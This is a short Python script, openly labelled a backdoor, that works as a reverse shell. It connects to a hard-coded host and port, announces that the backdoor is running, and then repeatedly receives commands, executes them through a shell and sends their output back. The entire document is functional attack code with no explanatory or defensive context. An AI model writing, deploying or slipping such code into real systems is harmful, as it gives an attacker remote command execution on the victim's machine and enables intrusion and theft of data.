import socket
import subprocess

host = '192.168.137.1'
port = 1002
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("<Backdoor>: Backdoor is running.")
while True:
    data = s.recv(10000)
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = proc.stdout.read()
    stderr = proc.stderr.read()
    s.send(stdout)
    s.send(stderr)
